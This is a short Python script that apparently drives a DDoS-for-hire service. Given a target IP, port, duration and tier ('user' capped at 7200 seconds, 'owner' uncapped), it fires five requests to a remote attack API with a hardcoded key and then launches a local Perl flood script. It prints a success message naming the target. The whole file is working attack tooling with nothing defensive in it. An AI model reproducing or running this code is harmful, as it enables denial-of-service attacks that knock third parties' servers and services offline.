import os,sys,requests,time,random


def SendFlood(ip, port:int, time1:int, who):
    CurrentServers = 5
    if who == "user" and time1 > 7200:
        return "Over 7200"
    elif who == "user" and time1 < 7200:
            key = "EIUWQIEuQWIEQWIOEYHUOHQUOHWEUODNASLDAUO"
            X = requests.get(f"http://1.1.1.1/api.php&key={key}&host={ip}&port={port}&time={time1}") # server 1
            E = requests.get(f"http://1.1.1.1/api.php&key={key}&host={ip}&port={port}&time={time1}") # server 2
            N = requests.get(f"http://1.1.1.1/api.php&key={key}&host={ip}&port={port}&time={time1}") # server 3
            O = requests.get(f"http://1.1.1.1/api.php&key={key}&host={ip}&port={port}&time={time1}") # server 4
            N = requests.get(f"http://1.1.1.1/api.php&key={key}&host={ip}&port={port}&time={time1}") # server 5
            time.sleep(5)
            os.system(f"perl ourscript.pl {ip} {port} {time1}")
            return f" [X] Successfully sent a flood to {ip}:{port} using '{CurrentServers}' Servers for {time1} seconds. [NORMAL]"
    elif who == "owner":
            key = "EIUWQIEuQWIEQWIOEYHUOHQUOHWEUODNASLDAUO"
            X = requests.get(f"http://1.1.1.1/api.php&key={key}&host={ip}&port={port}&time={time1}") # server 1
            E = requests.get(f"http://1.1.1.1/api.php&key={key}&host={ip}&port={port}&time={time1}") # server 2
            N = requests.get(f"http://1.1.1.1/api.php&key={key}&host={ip}&port={port}&time={time1}") # server 3
            O = requests.get(f"http://1.1.1.1/api.php&key={key}&host={ip}&port={port}&time={time1}") # server 4
            N = requests.get(f"http://1.1.1.1/api.php&key={key}&host={ip}&port={port}&time={time1}") # server 5
            time.sleep(5)
            os.system(f"perl ourscript.pl {ip} {port} {time1}")
            return f" [X] Successfully sent a flood to {ip}:{port} using '{CurrentServers}' Servers for {time1} seconds. [ULTRA]"
    else:
        return " [X] An error has occured."


ip = sys.argv[1]
port = (int(sys.argv[2]))
time2 = (int(sys.argv[3]))
who = sys.argv[4]
print (SendFlood(ip,port,time2,who))